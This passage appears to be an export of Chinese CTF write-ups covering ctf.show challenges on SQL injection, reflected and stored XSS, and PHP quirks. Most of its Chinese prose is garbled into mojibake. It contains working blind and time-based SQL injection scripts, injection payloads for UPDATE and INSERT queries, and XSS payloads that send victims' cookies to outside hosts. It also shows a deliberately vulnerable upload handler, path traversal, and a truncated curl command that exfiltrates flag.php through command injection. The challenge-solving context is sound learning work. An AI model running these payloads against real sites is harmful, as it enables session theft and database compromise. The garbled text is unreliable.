LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); \n```\n\n**222**\n\nGroup_byåé¢çš„å‚æ•°æ¥è¿›è¡Œå¸ƒå°”æ³¨å…¥\n\n```python\nimport requests\nurl=\"http://debba94a-3e3c-4b9e-97e0-27c6e7381dde.challenge.ctf.show/api/?u=\"\nca=\"ctfshow{1234567890-abcdef}\"\nfor i in range(1,100):\n    for j in ca:\n        payload=f'if(substr((select group_concat(flagaabc) from ctfshow_flaga),{i},1)=\"{j}\",\"username\",cot(0))'\n        tex=requests.get(url+payload).text\n        if \"username\" in tex:\n            print(j,end=\"\")\n            break;\n```\n\n**223**\n\nè¿‡æ»¤äº†æ•°å­—ï¼Œè´´ä¸ªå¤§ä½¬è„šæœ¬\n\n```python\n# @Author:Kradress\nimport requests\nimport string\n\nurl = \"http://7702b56c-35d9-4b80-abdc-bb0956f4bce5.challenge.ctf.show/api/\"\n\nresult = ''\ndict=string.ascii_lowercase+string.digits+\"_-,}{\"\n\n# çˆ†è¡¨å  \n# payload = \"select group_concat(table_name) from information_schema.tables where table_schema=database()\"\n# çˆ†åˆ—å\n# payload = \"select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_flagas'\"\n#çˆ†å­—æ®µå€¼\npayload = \"select flagasabc from ctfshow_flagas\"\n\ndef numToStr(str):\n    parts = []\n    for s in str:\n        parts.append(numToStr2(s))\n    res = ','.join(parts)\n    return f\"concat({res})\"\n\ndef numToStr2(num):\n    parts = []\n    n = ord(num)\n    for i in range(n):\n        parts.append(\"true\")\n    res = \"+\".join(parts)\n    return f\"char({res})\"\n\nfor i in range(1,46):\n    print(i)\n    for j in dict:\n        params={\n            'u' : f\"concat(if(substr(({payload}),{numToStr(str(i))},true)={numToStr(j)},username,cot(false)))#\"\n        }\n        r = requests.get(url, params=params)\n        # print(r.url)\n        if(\"ctfshow\" in r.text):\n            result +=j\n            print(result)\n            break\n```\n\n**224**\n\né€šè¿‡æ–‡ä»¶ä¿¡æ¯çš„æ³¨å…¥ï¼Œè¿™é‡Œæœ‰é¢–å¸ˆå‚…çš„[åšå®¢](https://blog.gem-love.com/ctf/2283.html)\n\n> ä½†æ˜¯å‘ç°è¿™ä¸ª`file()`æ–¹æ³•å¯ä»¥æ£€æµ‹å›¾ç‰‡çš„EXIFä¿¡æ¯ï¼Œè€ŒEXIFä¿¡æ¯ä¸­æœ‰ä¸€ä¸ªcommentå­—æ®µï¼Œç›¸å½“äºå›¾ç‰‡æ³¨é‡Šï¼Œè€Œ`finfo->file()`æ­£å¥½èƒ½å¤Ÿè¾“å‡ºè¿™ä¸ªä¿¡æ¯ï¼Œå¦‚æœä¸Šé¢çš„å‡è®¾æˆç«‹ï¼Œè¿™å°±å¯ä»¥é€ æˆSQLæ³¨å…¥\n>\n\nå†åˆ°åˆ«çš„å¸ˆå‚…é‚£é‡Œå»æ‹¿ä¸€ä¸ªæºç \n\n```php\n<?php\n\terror_reporting(0);\n\tif ($_FILES[\"file\"][\"error\"] > 0)\n\t{\n\t\tdie(\"Return Code: \" . $_FILES[\"file\"][\"error\"] . \"<br />\");\n\t}\n\tif($_FILES[\"file\"][\"size\"]>10*1024){\n\t\tdie(\"æ–‡ä»¶è¿‡å¤§: \" .($_FILES[\"file\"][\"size\"] / 1024) . \" Kb<br />\");\n\t}\n    if (file_exists(\"upload/\" . $_FILES[\"file\"][\"name\"]))\n      {\n      echo $_FILES[\"file\"][\"name\"] . \" already exists. \";\n      }\n    else\n      {\n\t  $filename = md5(md5(rand(1,10000))).\".zip\";\n      $filetype = (new finfo)->file($_FILES['file']['tmp_name']);\n      if(preg_match(\"/image|png|bmap|jpg|jpeg|application|text|audio|video/i\",$filetype)){\n        die(\"file type error\");\n      }\n\t  $filepath = \"upload/\".$filename;\n\t  $sql = \"INSERT INTO file(filename,filepath,filetype) VALUES ('\".$filename.\"','\".$filepath.\"','\".$filetype.\"');\";\n      move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],\n      \"upload/\" . $filename);\n\t  $con = mysqli_connect(\"localhost\",\"root\",\"root\",\"ctf\");\n\t\tif (!$con)\n\t\t{\n\t\t\tdie('Could not connect: ' . mysqli_error());\n\t\t}\n\t\tif (mysqli_multi_query($con, $sql)) {\n\t\t\theader(\"location:filelist.php\");\n\t\t} else {\n\t\t\techo \"Error: \" . $sql . \"<br>\" . mysqli_error($con);\n\t\t}\n\t\t \n\t\tmysqli_close($con);\n\t\t\n      }\n    \n?>\n```\n\nçœ‹åˆ°filetypeå˜é‡ç¡®å®é€šè¿‡finfoå–äº†å†…å®¹ï¼Œæˆ‘ä»¬æœ¬åœ°è·‘ä¸€ä¸‹\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208302009630.png)\n\nç¡®å®è¾“å‡ºäº†éƒ¨åˆ†çš„æ–‡ä»¶ä¿¡æ¯ï¼Œçœ‹ç¾¤é‡Œç»™çš„payloadï¼Œä½¿ç”¨çš„æ˜¯binæ–‡ä»¶ï¼Œæ„é€ çš„æ–‡ä»¶éƒ¨åˆ†å†…å®¹è¢«è¾“å‡º\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208302053318.png)\n\nä¸Šä¼ æ‹¿shellå³å¯\n\nåè®°ï¼šä¼¼ä¹è¿™é‡Œæ‹¿åˆ°çš„æ˜¯fileå‘½ä»¤è·å–çš„å†…å®¹\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208302055956.png)\n\n**225**\n\nå †å ï¼š\n\n```\nprepare a from 0xåå…­è¿›åˆ¶è¯­å¥;execute a;\n```\n\n**226**\n\nåŒä¸Š\n\n**227**\n\næ²¡æŸ¥å‡ºæ¥ä¸œè¥¿ï¼Œçœ‹WPï¼Œé€šè¿‡æŸ¥è¯¢`information_schema.routines`æŸ¥çœ‹å­˜å‚¨è¿‡ç¨‹å’Œå‡½æ•°\n\n> å­˜å‚¨è¿‡ç¨‹ï¼ˆStored Procedureï¼‰æ˜¯ä¸€ç§åœ¨æ•°æ®åº“ä¸­å­˜å‚¨å¤æ‚ç¨‹åºï¼Œä»¥ä¾¿å¤–éƒ¨ç¨‹åºè°ƒç”¨çš„ä¸€ç§æ•°æ®åº“å¯¹è±¡ã€‚\n> å­˜å‚¨è¿‡ç¨‹æ˜¯ä¸ºäº†å®Œæˆç‰¹å®šåŠŸèƒ½çš„SQLè¯­å¥é›†ï¼Œç»ç¼–è¯‘åˆ›å»ºå¹¶ä¿å­˜åœ¨æ•°æ®åº“ä¸­ï¼Œç”¨æˆ·å¯é€šè¿‡æŒ‡å®šå­˜å‚¨è¿‡ç¨‹çš„åå­—å¹¶ç»™å®šå‚æ•°(éœ€è¦æ—¶)æ¥è°ƒç”¨æ‰§è¡Œã€‚\n> å­˜å‚¨è¿‡ç¨‹æ€æƒ³ä¸Šå¾ˆç®€å•ï¼Œå°±æ˜¯æ•°æ®åº“ SQL è¯­è¨€å±‚é¢çš„ä»£ç å°è£…ä¸é‡ç”¨ã€‚\n\nå°±æ˜¯å­˜äº†å·²ç»å®šä¹‰å¥½çš„å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°getFlagå‡½æ•°ï¼Œä¹Ÿèƒ½çœ‹åˆ°flagï¼Œè°ƒç”¨çš„è¯ä½¿ç”¨call getFlagå°±å¥½\n\n**228,229,230**\n\néƒ½æ˜¯ä¸Šé¢çš„\n\n**231**\n\nupdateå¼€å§‹ï¼Œç¬¬ä¸€é“é¢˜ç›´æ¥è¿ç€usernameä¸€èµ·æ”¹\n\n```\npassword=0',username=(select group_concat(flagas) from flaga where table_schema=database())%23&username=1\n```\n\n**232**\n\nmd5é—®é¢˜ä¸å¤§ï¼Œå¤šè£¹ä¸ªæ‹¬å·å°±è¡Œ\n\n```\npassword=0'),username=(select group_concat(flagass) from flagaa)%23&username=1\n```\n\n**233**\n\nä¼¼ä¹å•å¼•å·æ¶ˆå¤±äº†ï¼Œè½¬ä¹‰ç„¶åå’Œåé¢usernameçš„é—­åˆå°±è¡Œ\n\n```\npassword=\\&username=,username=(select group_concat(flagass233) from flag233333)%23\n```\n\n**234**\n\nå•åŒä¸€èµ·ï¼ŒåŒä¸Š\n\n```\npassword=\\&username=,username=(select group_concat(flagass23s3) from flag23a)%23\n```\n\n**235**\n\næ— åˆ—åæ³¨å…¥ï¼Œçœ‹[è¿™é‡Œ](https://blog.csdn.net/qq_31620591/article/details/117067799)\n\n```\npassword=\\&username=,username=(select group_concat(`2`) from (select 1,2,3 union select * from flag23a1) as a)%23\n```\n\n**236**\n\nå¤šæ»¤äº†ä¸ªflagï¼Œæ²¡åµç”¨\n\n```\npassword=\\&username=,username=(select group_concat(`2`)  from (select 1,2,3 union select * from flaga) as a)%23\n```\n\n**237**\n\nè¿›å…¥insertç¯èŠ‚ï¼Œé—­åˆï¼Œæ‹¿æ•°æ®ï¼Œæ’å…¥\n\n```\nusername=1',(select group_concat(flagass23s3) from flag))%23&password=1\n```\n\n**238**\n\næ²¡æœ‰ç©ºæ ¼ç”¨æ‹¬å·\n\n```\nusername=1',(select(group_concat(flag))from(flagb)))%23&password=1\n```\n\n**239**\n\nåˆä¸€ä¸ªæ— åˆ—åï¼Œæ³¨ä¸è¿›å»ï¼Œä¹Ÿä¸çŸ¥é“å“ªé‡Œå‡ºé—®é¢˜äº†\n\n**240**\n\næœ‰è¡¨åé‚£ä¸ç‹ ç‹ çš„çˆ†ç ´ï¼Ÿ\n\n```python\nimport requests\nimport itertools\nimport time\nurl=\"http://6be0cd82-3931-4919-a3e1-bfdcd72e685a.challenge.ctf.show/api/insert.php\"\ns='ab'\na=map(''.join, itertools.product('ab', repeat=5))\nfor i in a:\n    table='flag'+i;\n    data={'username':f\"1',(select(flag)from({table})))#\",'password':'1'}\n    requests.post(url,data=data)\n    time.sleep(0.1)\n```\n\n**241**\n\nå¼€å§‹åˆ ä¸œè¥¿äº†ï¼Œå°±20æ¡ï¼Œç”¨æ—¶é—´ç›²æ³¨å§ï¼Œè„šæœ¬from yuå¸ˆå‚…\n\n```python\n# @Author:yu22x\nimport requests\nimport time\nimport urllib.parse\nurl = \"http://b37e7121-22c6-4917-bfa5-ddc38a0ed78f.challenge.ctf.show/api/delete.php\"\ns='0123456789abcdef-'\nflag='ctfshow{'\n\nfor i in range(9,46):\n\t\tprint(i)\n\t\tfor j in s:\n\t\t\tdata={'id':f'0||if(substr((select flag from flag),{i},1)=\"{j}\",sleep(1),0)'}\n\t\t\t#print(data)\n\t\t\ttry:\n\t\t\t\trequests.post(url,data=data,timeout=1)\n\t\t\texcept:\n\t\t\t\tflag+=j  \n\t\t\t\tprint(flag)\n\t\t\t\tbreak\n\t\t\ttime.sleep(1)\n```\n\n**242**\n\nè¿›è¡Œä¸€ä¸ªæ–‡ä»¶çš„dump\n\n\n\n"},{"title":"CTFshowXSS","url":"/posts/36544.html","content":"\né¦–å…ˆè‡ªå·±æ­å»ºæˆ–è€…æ‰¾[xssæµ‹è¯•å¹³å°](https://xss8.cc/login/)è¿˜æœ‰[å¦ä¸€ä¸ª](https://xss.pt/)\n\n**316**\n\n```\næœ€ç®€å•çš„ï¼š\n<script>document.location.href='http://æœåŠ¡å™¨IP/?x='document.cookie</script>\n```\n\n**317**\n\nè¿‡æ»¤äº†script\n\n```\n<body onload=\"document.location.href='http://æœåŠ¡å™¨IP/?x='+document.cookie\"></body>\n```\n\n**318**\n\nè¿‡æ»¤äº†imgï¼Œä½¿ç”¨iframe\n\n```\n<iframe WIDTH=0 HEIGHT=0 srcdoc=ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚&#60;&#115;&#67;&#82;&#105;&#80;&#116;&#32;&#115;&#82;&#67;&#61;&#34;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#48;&#120;&#46;&#97;&#120;&#47;&#107;&#48;&#74;&#106;&#34;&#62;&#60;&#47;&#115;&#67;&#114;&#73;&#112;&#84;&#62;>\n<BODY\tONLOAD=document.location='http://xss.darkflow.top?cookie='+document.cookie;>\n```\n\n**319**\n\nåŒä¸Šå³å¯\n\n**320**\n\nè¿‡æ»¤äº†ç©ºæ ¼ï¼Œscriptï¼Œç”¨tab\n\n```\n<iframe\tWIDTH=0\tHEIGHT=0\tsrcdoc=ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚&#60;&#115;&#67;&#82;&#105;&#80;&#116;&#32;&#115;&#82;&#67;&#61;&#34;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#48;&#120;&#46;&#97;&#120;&#47;&#107;&#48;&#74;&#106;&#34;&#62;&#60;&#47;&#115;&#67;&#114;&#73;&#112;&#84;&#62;>\n```\n\n**321**\n\nè¿‡æ»¤äº†imgï¼ŒåŒä¸Š\n\n**322**\n\nåŒä¸Š\n\n**323**\n\nè¿‡æ»¤äº†iframeï¼Œä½¿ç”¨body onloadï¼ˆè‰¹å±…ç„¶è¿‡æ»¤äº†xssï¼Œæˆ‘çš„åŸŸåé‡Œæœ‰xsså•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šï¼‰\n\n```\n<body/onload=document.location='http://20.231.29.154:5000/?cookie='+document.cookie;>\n```\n\nä¸€ç›´åˆ°326é€šæ€\n\næµ…æ€»ç»“ï¼šçœ‹è¿™å‡ é“é¢˜æ¥è¯´ï¼Œåå°„æ€§xssæ— éå°±æ˜¯å˜æ¢æ ‡ç­¾ï¼Œç»“åˆå„ç§ç¼–ç å»ç»•è¿‡ï¼Œç©ºæ ¼ç”¨`\\`ï¼Œå…³é”®å­—åŒå†™æˆ–è€…ç¼–ç ç­‰ç­‰\n\n\n\nå­˜å‚¨å‹XSSå¼€å§‹\n\n**327**\n\næ”¶ä»¶äººä¸ºadminï¼Œå†…å®¹ä¸ºXSSå³å¯\n\n```\n<body/onload=document.location='http://20.231.29.154:5000/?cookie='+document.cookie;>\n```\n\n**328**\n\næ„é€ jså·ç®¡ç†å‘˜cookieï¼ˆä¸çŸ¥é“ä¸ºå•¥æˆ‘å·äº†ç™»é™†äº†ä¹Ÿä¸è¡Œï¼‰\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-20 17.41.19.png)\n\nç”¨è¶…å¼ºæ¨¡å—å§\n\n```\n<sCRiPt sRC=//xss8.cc/R9YM></sCrIpT>\n```\n"},{"title":"CTFshowPHPç‰¹æ€§","url":"/posts/47427.html","content":"\n**89**\n\næ•°ç»„ç»•è¿‡\n\n```\nintval()ç”¨äºè·å–å˜é‡çš„æ•´æ•°å€¼\nintval() å‡½æ•°é€šè¿‡ä½¿ç”¨æŒ‡å®šçš„è¿›åˆ¶baseè½¬æ¢ï¼ˆé»˜è®¤æ˜¯åè¿›åˆ¶ï¼‰ï¼Œè¿”å›å˜é‡varçš„integeræ•°å€¼ã€‚intval()ä¸èƒ½ç”¨äºobjectï¼Œå¦åˆ™ä¼šäº§ç”ŸE_NOTICEé”™è¯¯å¹¶è¿”å›1ã€‚\nè¯­æ³•\nint intval ( mixed $var [, int $base = 10 ] )\n```\n\n**90**\n\nåå…­è¿›åˆ¶\n\n**91**\n\n```\nif(preg_match('/^php$/im', $a)){\n    if(preg_match('/^php$/i', $a)){\n        echo 'hacker';\n    }\n//mä»£è¡¨å¤šè¡ŒåŒ¹é…ï¼Œæ¢è¡Œç¬¦åŠ phpå³å¯\n//cmd=%0Aphp\n```\n\n**92**\n\nåŒ90\n\n**93**\n\næ»¤äº†16è¿›åˆ¶ï¼Œä½¿ç”¨8è¿›åˆ¶ç»•è¿‡\n\n```\n?num=010574\n```\n\n**94**\n\nå…¨ç­‰ç”¨å°æ•°ç»•è¿‡\n\n```\n?num=4476.01\n```\n\n**95**\n\nå°æ•°ç‚¹æ²¡äº†ï¼Œç”¨å…«è¿›åˆ¶åŠ æ­£å·ç»•è¿‡0è¿‡æ»¤\n\n```\n?num=+010574\n```\n\n**96**\n\n```\n?u=./flag.php\n```\n\n**97**\n\nmd5å¼ºç›¸ç­‰æ•°ç»„ç»•è¿‡\n\n```\na[]=1&b[]=2\n```\n\n**98**\n\nåˆ†æä»£ç \n\n```\n3.\t$_GET?$_GET=&$_POST:'flag';\n\n    if ($_GET) {\t\t\t//åªè¦æœ‰è¾“å…¥çš„getå‚æ•°\n        $_GET = &$_POST; //å°±å°†getæ–¹æ³•æ”¹å˜ä¸ºpostæ–¹æ³•(ä¿®æ”¹äº†getæ–¹æ³•çš„åœ°å€)\n        \t\t\t\t// æ¯”å¦‚$_GET[a] = &$_POST[a]ï¼Œgetä¼ aæ— ä½œç”¨ï¼Œå¿…é¡»ç”¨POST\n    } else {\n        \"flag\";\n    }\n\n4ã€5è¡Œæ— ä½œç”¨\n\n6.\thighlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);\n\n    if ($_GET['HTTP_FLAG'] == 'flag') { //éœ€è¦æ»¡è¶³è¿™ä¸ªæ¡ä»¶å°±å¯ä»¥è¾“å‡ºflag\n        highlight_file($flag);\t\t\t//å› ä¸ºæ²¡æœ‰ctfshow{xxxxx}è¿™ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥ä¼šäº§ç”ŸæŠ¥é”™\n        \t\t\t\t\t\t\t\t//è¿›è€Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°flagå†…å®¹\n    } else {\n        highlight_file(__FILE__);\n    }\næ„é€ POST\nHTTP_FLAG=flag\nå†æ·»åŠ ä»»æ„getå‚æ•°å³å¯\n```\n\n**99**\n\n```\nin_arrayå‡½æ•°å¦‚æœä¸è®¾ç½®strictå‚æ•°ä¸ºçœŸåˆ™è¿›è¡Œè‹¥æ¯”è¾ƒï¼Œ1.php==1\npayloadï¼šn=1.php\nPOST\ncontent=ä¸€å¥è¯æœ¨é©¬\n```\n\n**100**\n\nåœ¨PHPä¸­ï¼Œ=èµ‹å€¼è¿ç®—ç¬¦ä¼˜å…ˆçº§é«˜äºandï¼Œæ‰€ä»¥è¯­å¥æ‰§è¡Œæ˜¯v0=is_numeric(v1)ï¼Œä¼ å…¥v1ä¸ºæ•°å­—å³å¯\n\n```\n?v1=1&v2=var_dump($ctfshow)&v3=;\n```\n\n**101**\n\nåå°„ç±»\n\n```php\né¡¾åæ€ä¹‰ï¼Œå°±æ˜¯ä¸€ä¸ªç±»çš„åå°„ï¼ˆåºŸè¯ä¹ˆä¸æ˜¯ï¼‰\nä¸‹é¢æ˜¯ä¾‹å­\nclass fuc { //å®šä¹‰ä¸€ä¸ªç±»\n static\n function ec() {\n  echo 'æˆ‘æ˜¯ä¸€ä¸ªç±»';\n }\n}\n$class=new ReflectionClass('fuc'); //å»ºç«‹ fucè¿™ä¸ªç±»çš„åå°„ç±»\n$fuc=$class->newInstance(); //ç›¸å½“äºå®ä¾‹åŒ– fuc ç±»\n$fuc->ec(); //æ‰§è¡Œ fuc é‡Œçš„æ–¹æ³•ec\n$ec=$class->getmethod('ec'); //è·å–fuc ç±»ä¸­çš„ecæ–¹æ³•\n$fuc=$class->newInstance(); //å®ä¾‹åŒ–\n$ec->invoke($fuc);   //æ‰§è¡Œec æ–¹æ³•\n```\n\nPayload\n\n```\n?v1=1&v2=echo new Reflectionclass&v3=;\n```\n\n\n\n\n\n**102**\n\n```\nå…ˆè½¬base64å†è½¬16è¿›åˆ¶å®Œæˆç»•è¿‡\n```\n\n**103**\n\nåŒä¸Š\n\n**104**\n\næ²¡éªŒè¯ç›´æ¥ä¼ ä¿©ä¸€æ ·çš„å‘—\n\n**105**\n\n```PHP\nforeach($_GET as $key => $value){\n    if($key==='error'){\n        die(\"what are you doing?!\");\n    }\n    $$key=$$value;\n}foreach($_POST as $key => $value){\n    if($value==='flag'){\n        die(\"what are you doing?!\");\n    }\n    $$key=$$value;\n}\nå¤šç§æ“ä½œæ–¹æ³•\né€šè¿‡die($error)è¾“å‡º\npayload:a=flag \nPOST: error=a\nè¿›è¡Œçš„æ“ä½œä¸º\n$a=$flag;\n$error=$a;\n\næ­¤æ—¶$a=flag{test123};$error=flag{test123};ä»è€Œè¾“å‡ºerrorä¹Ÿå°±æ˜¯è¾“å‡ºflag\né€šè¿‡die($suces)\npayload:suces=flag&flag=\nè¿›è¡Œçš„æ“ä½œä¸º\n$suces=$flag;\n\n```\n\n**106**\n\næ„é€ æ•°ç»„æˆ–å¼±ç›¸ç­‰ç»•è¿‡\n\n```\naaroZmOk\naaK1STfY\naaO8zKZF\naa3OFF9m\n```\n\n**107**\n\n```php\nparse_strå‡½æ•°ï¼Œå°†å­—ç¬¦ä¸²è§£ææˆå¤šä¸ªå˜é‡\n$a=\"x=1&y=2\";\nparse_str($a,$b);\næ­¤æ—¶$b['x']ä¸º1ï¼Œ$b['y']ä¸º2\n\npaylaod:?v3=1\nPOST\nv1=flag=c4ca4238a0b923820dcc509a6f75849b\n```\n\n**108**\n\næ­£åˆ™è¡¨è¾¾å¼%00æˆªæ–­ï¼Œæ­£åˆ™è¡¨è¾¾å¼åªä¼šåŒ¹é…%00ä¹‹å‰çš„å†…å®¹\n\n```\nstrrev()//åè½¬å­—ç¬¦ä¸²\nintval()//å–æ•´æ•°\npayload:?c=a%00778\n```\n\n**109**\n\n```php\neval(\"echo new $v1($v2());\");\n//æ„é€ ä½¿å¾—v1åç§°çš„ç±»å­˜åœ¨åé¢ä»»æ„æ„é€ å³å¯\n```\n\n**110**\n\n```PHP\nFilesystemIteratorç±»çš„ä½¿ç”¨\n$a=new FilesystemIterator(getcwd());\nwhile($a->valid()){\n  echo $a->getFilename().\"\\n\";\n  $a->next();\n}\nè¿­ä»£è¾“å‡ºå½“å‰ç›®å½•ä¸‹çš„å†…å®¹\ngetcwd()//å–å¾—å½“å‰å·¥ä½œç›®å½•\n```\n\n**111**\n\nv1è¦åœ¨æ­£åˆ™ä¸­ç­‰äºctfshowï¼Œæ‰§è¡Œçš„è¯­å¥å°±æ˜¯\n\n```\n$ctfshow=&$(v2çš„å€¼);\nvar_dump($ctfshow);\nç›¸å½“äºæ‰§è¡Œäº†\nvar_dump($(v2çš„å€¼));\nä»¤v2=GLOBALSè¶…å…¨å±€å˜é‡å³å¯å°†æ‰€æœ‰å˜é‡æ‰“å°\npayload:?v1=ctfshow&v2=GLOBALS\n```\n\n**112**\n\n```\nURLäºŒæ¬¡ç¼–ç ï¼Œé¢˜ç›®ä¸­æŠŠbase64æ»¤è¿‡äº†ï¼Œå¯¹bè¿›è¡ŒäºŒæ¬¡URLç¼–ç å³å¯ï¼Œä¼ å…¥phpæ—¶è¿›è¡Œä¸€æ¬¡è§£ç ï¼Œè°ƒç”¨phpä¼ªåè®®æ—¶å†æœ‰ä¸€æ¬¡\n```\n\n**113**\n\nå‹ç¼©æµè¯»å–\n\n```\npayload:?file=compress.zlib:///var/www/html/flag.php\n```\n\n**114**\n\n```\nphp://filter\n```\n\n**115**\n\nåœ¨æ•°å­—å‰åŠ ä¸Šç©ºæ ¼ï¼Œä¹Ÿä¼šè¢«is_numericå‡½æ•°è®¤ä¸ºæ˜¯æ•°å­—\n\ntrimå‡½æ•°ä¼šè¿‡æ»¤ç©ºæ ¼ä»¥åŠ`\\n\\r\\t\\v\\0`ï¼Œä½†ä¸ä¼šè¿‡æ»¤`\\f`\n\næœ€ç»ˆpayload:urlencode(\"\\f\".36)\n\n**123**\n\n```\nPHPå˜é‡ååº”è¯¥åªæœ‰æ•°å­—å­—æ¯ä¸‹åˆ’çº¿,åŒæ—¶GETæˆ–POSTæ–¹å¼ä¼ è¿›å»çš„å˜é‡å,ä¼šè‡ªåŠ¨å°†ç©ºæ ¼ï¼Œ+ï¼Œ.ï¼Œ[è½¬æ¢ä¸º_ï¼Œä½†æ˜¯å½“æœ‰ç‰¹æ®Šå­—ç¬¦[æ—¶ï¼Œåé¢çš„å†…å®¹ä¸­å°±ä¸ä¼šæ›¿æ¢äº†\npayload:\nPOST:\nCTF_SHOW=1&CTF[SHOW.COM=1&fun=echo $flag\n```\n\n**125**\n\n```\nCTF_SHOW=1&CTF[SHOW.COM=1&fun=var_export(get_defined_vars())\nCTF_SHOW=1&CTF[SHOW.COM=1&fun=highlight_file($_GET[1])\n?1=flag.php\n```\n\n**126**\n\n```\n1ã€cliæ¨¡å¼ï¼ˆå‘½ä»¤è¡Œï¼‰ä¸‹\nç¬¬ä¸€ä¸ªå‚æ•°$_SERVER['argv'][0]æ˜¯è„šæœ¬åï¼Œå…¶ä½™çš„æ˜¯ä¼ é€’ç»™è„šæœ¬çš„å‚æ•°\n2ã€webç½‘é¡µæ¨¡å¼ä¸‹\nåœ¨webé¡µæ¨¡å¼ä¸‹å¿…é¡»åœ¨php.iniå¼€å¯register_argc_argvé…ç½®é¡¹\nè®¾ç½®register_argc_argv = On(é»˜è®¤æ˜¯Off)ï¼Œé‡å¯æœåŠ¡ï¼Œ$_SERVER[â€˜argvâ€™]æ‰ä¼šæœ‰æ•ˆæœ\nè¿™æ—¶å€™çš„$_SERVER[â€˜argvâ€™][0] = $_SERVER[â€˜QUERY_STRINGâ€™]//è¿™é‡Œçš„è¿™ä¸ªå‚æ•°å°±æ˜¯GETè¯·æ±‚ä¸­?åçš„å†…å®¹\n$argv,$argcåœ¨webæ¨¡å¼ä¸‹ä¸é€‚ç”¨\n```\n\n```\npayload:?$fl0g=flag_give_me;\nCTF_SHOW=1&CTF[SHOW.COM=1&fun=eval($a[0])\n```\n\n**127**\n\nå‰é¢çš„è‡ªåŠ¨è½¬æ¢å’¯\n\n**128**\n\n```\nå°çŸ¥è¯†ç‚¹ï¼š _()æ˜¯ä¸€ä¸ªå‡½æ•°\n_()==gettext() æ˜¯gettext()çš„æ‹“å±•å‡½æ•°ï¼Œå¼€å¯textæ‰©å±•ã€‚éœ€è¦phpæ‰©å±•ç›®å½•ä¸‹æœ‰php_gettext.dll\nget_defined_vars()å‡½æ•°\nget_defined_vars â€” è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ è¿™æ ·å¯ä»¥è·å¾— $flag\npayload: ?f1=_&f2=get_defined_vars\n```\n\n**129**\n\nç›®å½•ç©¿è¶Š\n\n```\npayload:?f=/ctfshow/../../../../var/www/html/flag.php \n```\n\n**130**\n\næ­£åˆ™/.+?ctfshow/is\n\nstripos($f, 'ctfshow') === FALSE\n\nstriposè¿”å›ä½ç½®ä»0å¼€å§‹ï¼ŒæœªæŸ¥æ‰¾åˆ°æ‰è¿”å›falseï¼Œåœ¨ä¸¥æ ¼ç›¸ç­‰ä¸­ä¸ç›¸ç­‰\n\nç›´æ¥ç»•\n\nf=ctfshow\n\n**131**\n\n[æ­£åˆ™æº¢å‡º](https://www.laruence.com/2010/06/08/1579.html)\n\nä¼ ä¸ªè¶…è¿‡ä¸€ç™¾ä¸‡é•¿åº¦çš„å­—ç¬¦å°±å¥½å•¦\n\n```\nf='kkkk'*250000+'36Dctfshow'\n#pythonçœŸå¥½ç”¨\n```\n\n**132**\n\nrobots.txtè¿›admin\n\nå¯¹äºâ€œä¸â€ï¼ˆ&&ï¼‰ è¿ç®—ï¼š x && y å½“xä¸ºfalseæ—¶ï¼Œç›´æ¥è·³è¿‡ï¼Œä¸æ‰§è¡Œyï¼›\n\nå¯¹äºâ€œæˆ–â€ï¼ˆ||ï¼‰ è¿ç®— ï¼š x||y å½“xä¸ºtrueæ—¶ï¼Œç›´æ¥è·³è¿‡ï¼Œä¸æ‰§è¡Œyã€‚\n\nåœ¨åˆ¤æ–­è¿™ä¸ªçš„æ—¶å€™if($code === mt_rand(1,0x36D) && $password === $flag || $username ===\"admin\") ç¬¬ä¸€ä¸ª$code === mt_rand(1,0x36D)ä¸ºfalse,ä¹‹åå°±æ‰§è¡Œ|| $username ===\"admin\"\n\nåé¢æœ‰æˆ–ï¼Œæ‰€ä»¥æ»¡è¶³username==='admin'å³å¯\n\n```\npayload:/admin/?code=admin&password=&username=admin\n```\n\n**133**\n\n[éªšæ“ä½œ](https://blog.csdn.net/qq_46091464/article/details/109095382)\n\n```\næˆ‘ä»¬ä¼ é€’?F=`$F`;+sleep 3å¥½åƒç½‘ç«™ç¡®å®sleepäº†ä¸€ä¼šè¯´æ˜çš„ç¡®æ‰§è¡Œäº†å‘½ä»¤\n**é‚£ä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼Ÿ**\nå› ä¸ºæ˜¯æˆ‘ä»¬ä¼ é€’çš„`$F`;+sleep 3ã€‚å…ˆè¿›è¡Œsubstr()å‡½æ•°æˆªæ–­ç„¶åå»æ‰§è¡Œeval()å‡½æ•°\nè¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯æ‰§è¡Œphpä»£ç ï¼Œ``æ˜¯shell_exec()å‡½æ•°çš„ç¼©å†™ï¼Œç„¶åå°±å»å‘½ä»¤æ‰§è¡Œã€‚\nè€Œ$Få°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„`$F`;+sleep 3 ä½¿ç”¨æœ€åæ‰§è¡Œçš„ä»£ç åº”è¯¥æ˜¯\n`$F`;\n$Få˜é‡å†…å®¹å°±æ˜¯æˆ‘ä»¬æœ€ç»ˆæ‰§è¡Œçš„å†…å®¹\n```\n\nä½¿ç”¨ä¸€æŠŠburpè‡ªå¸¦çš„åŠŸèƒ½ï¼ŒBurp Collaboratorï¼Œç›¸è¾ƒäºDNSLogçš„å¥½å¤„å°±æ˜¯å¯ä»¥å¸¦å‡ºPOSTä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥æºå¸¦Cookie\n\nè¿˜æœ‰curlå‘½ä»¤çš„ä½¿ç”¨\n\n```\npayload:?F=`$F`;+curl -X POST -F xx=@flag.php  